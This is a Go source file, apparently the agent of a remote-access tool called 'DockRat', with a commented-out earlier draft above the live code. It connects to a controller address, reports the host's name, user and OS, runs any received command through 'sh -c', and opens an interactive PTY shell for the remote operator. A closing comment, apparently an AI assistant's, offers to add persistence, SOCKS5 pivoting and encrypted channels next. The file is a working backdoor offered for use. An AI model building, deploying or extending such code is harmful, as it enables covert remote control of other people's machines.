// package main

// import (
// 	"encoding/json"
// 	"io"
// 	"log"
// 	"net"
// 	"os"
// 	"os/exec"
// 	"runtime"

// 	"github.com/Singert/DockRat/core/protocol"
// )

// type HandshakePayload struct {
// 	Hostname string `json:"hostname"`
// 	Username string `json:"username"`
// 	OS       string `json:"os"`
// }

// func main() {
// 	adminAddr := "127.0.0.1:9999"
// 	conn, err := net.Dial("tcp", adminAddr)
// 	if err != nil {
// 		log.Fatalf("[-] Failed to connect to admin: %v", err)
// 	}
// 	defer conn.Close()
// 	log.Println("[+] Connected to admin!")

// 	hostname, _ := os.Hostname()
// 	username := os.Getenv("USER")
// 	if username == "" {
// 		username = os.Getenv("USERNAME")
// 	}

// 	payload := HandshakePayload{
// 		Hostname: hostname,
// 		Username: username,
// 		OS:       runtime.GOOS,
// 	}
// 	payloadBytes, _ := json.Marshal(payload)

// 	msg := protocol.Message{
// 		Type:    protocol.MsgHandshake,
// 		Payload: payloadBytes,
// 	}

// 	data, err := protocol.EncodeMessage(msg)
// 	if err != nil {
// 		log.Fatalf("[-] Failed to encode message: %v", err)
// 	}

// 	_, err = conn.Write(data)
// 	if err != nil {
// 		log.Fatalf("[-] Failed to send message: %v", err)
// 	}

// 	log.Println("[+] Handshake message sent")

// 	for {
// 		if err := handleIncoming(conn); err != nil {
// 			log.Println("[-] Connection closed or failed:", err)
// 			break
// 		}
// 	}
// }

// func handleIncoming(conn net.Conn) error {
// 	lengthBuf := make([]byte, 4)
// 	if _, err := io.ReadFull(conn, lengthBuf); err != nil {
// 		return err
// 	}
// 	length := bytesToUint32(lengthBuf)
// 	data := make([]byte, length)
// 	if _, err := io.ReadFull(conn, data); err != nil {
// 		return err
// 	}

// 	msg, err := protocol.DecodeMessage(data)
// 	if err != nil {
// 		return err
// 	}

// 	switch msg.Type {
// 	case protocol.MsgCommand:
// 		var payload map[string]string
// 		if err := json.Unmarshal(msg.Payload, &payload); err != nil {
// 			return err
// 		}
// 		cmdStr := payload["cmd"]
// 		log.Println("[+] Received command:", cmdStr)

// 		// 执行命令
// 		output, err := exec.Command("sh", "-c", cmdStr).CombinedOutput()
// 		if err != nil {
// 			output = append(output, []byte("\n[!] Command error: "+err.Error())...)
// 		}

// 		respMsg := protocol.Message{
// 			Type:    protocol.MsgResponse,
// 			Payload: output,
// 		}
// 		respData, err := protocol.EncodeMessage(respMsg)
// 		if err != nil {
// 			return err
// 		}
// 		_, err = conn.Write(respData)
// 		return err
// 	default:
// 		log.Println("[-] Unknown message type:", msg.Type)
// 		return nil
// 	}
// }

// func bytesToUint32(b []byte) uint32 {
// 	return uint32(b[0])<<24 | uint32(b[1])<<16 | uint32(b[2])<<8 | uint32(b[3])
// }

package main

import (
	"encoding/json"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"

	"github.com/Singert/DockRat/core/protocol"
	"github.com/creack/pty"
)

type HandshakePayload struct {
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	OS       string `json:"os"`
}

var shellStarted = false
var shellStdin io.WriteCloser

func main() {
	adminAddr := "127.0.0.1:9999"
	conn, err := net.Dial("tcp", adminAddr)
	if err != nil {
		log.Fatalf("[-] Failed to connect to admin: %v", err)
	}
	defer conn.Close()
	log.Println("[+] Connected to admin!")

	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}

	payload := HandshakePayload{
		Hostname: hostname,
		Username: username,
		OS:       runtime.GOOS,
	}
	payloadBytes, _ := json.Marshal(payload)

	msg := protocol.Message{
		Type:    protocol.MsgHandshake,
		Payload: payloadBytes,
	}

	data, err := protocol.EncodeMessage(msg)
	if err != nil {
		log.Fatalf("[-] Failed to encode message: %v", err)
	}

	_, err = conn.Write(data)
	if err != nil {
		log.Fatalf("[-] Failed to send message: %v", err)
	}

	log.Println("[+] Handshake message sent")

	for {
		if err := handleIncoming(conn); err != nil {
			log.Println("[-] Connection closed or failed:", err)
			break
		}
	}
}

func handleIncoming(conn net.Conn) error {
	lengthBuf := make([]byte, 4)
	if _, err := io.ReadFull(conn, lengthBuf); err != nil {
		return err
	}
	length := bytesToUint32(lengthBuf)
	data := make([]byte, length)
	if _, err := io.ReadFull(conn, data); err != nil {
		return err
	}

	msg, err := protocol.DecodeMessage(data)
	if err != nil {
		return err
	}

	switch msg.Type {
	case protocol.MsgCommand:
		var payload map[string]string
		if err := json.Unmarshal(msg.Payload, &payload); err != nil {
			return err
		}
		cmdStr := payload["cmd"]
		log.Println("[+] Received command:", cmdStr)

		output, err := exec.Command("sh", "-c", cmdStr).CombinedOutput()
		if err != nil {
			output = append(output, []byte("\n[!] Command error: "+err.Error())...)
		}

		respMsg := protocol.Message{
			Type:    protocol.MsgResponse,
			Payload: output,
		}
		respData, err := protocol.EncodeMessage(respMsg)
		if err != nil {
			return err
		}
		_, err = conn.Write(respData)
		return err

	case protocol.MsgShell:
		if !shellStarted {
			cmd := exec.Command("/bin/sh")
			ptmx, err := pty.Start(cmd)
			if err != nil {
				log.Println("[-] Failed to start pty:", err)
				return err
			}
			shellStarted = true
			shellStdin = ptmx

			go func() {
				buf := make([]byte, 1024)
				for {
					n, err := ptmx.Read(buf)
					if err != nil {
						log.Println("[-] Shell read error:", err)
						return
					}
					msg := protocol.Message{
						Type:    protocol.MsgShell,
						Payload: buf[:n],
					}
					data, err := protocol.EncodeMessage(msg)
					if err != nil {
						log.Println("[-] Shell encode error:", err)
						return
					}
					_, err = conn.Write(data)
					if err != nil {
						log.Println("[-] Shell write error:", err)
						return
					}
				}
			}()
		} else {
			// 后续输入写入 pty
			line := string(msg.Payload)
			if !strings.HasSuffix(line, "\n") {
				line += "\n"
			}
			_, err := shellStdin.Write([]byte(line))
			if err != nil {
				log.Println("[-] Write to shell error:", err)
				return err
			}
		}
		return nil

	default:
		log.Println("[-] Unknown message type:", msg.Type)
		return nil
	}
}

func bytesToUint32(b []byte) uint32 {
	return uint32(b[0])<<24 | uint32(b[1])<<16 | uint32(b[2])<<8 | uint32(b[3])
}

/*是否继续实现：

    🐚 持久化 shell 模式（交互式 stdin/stdout）

    🛰️ socks5 转发或端口映射

    🔐 TLS/AES 加密通信层

你可以指定想优先开发的子模块。 */
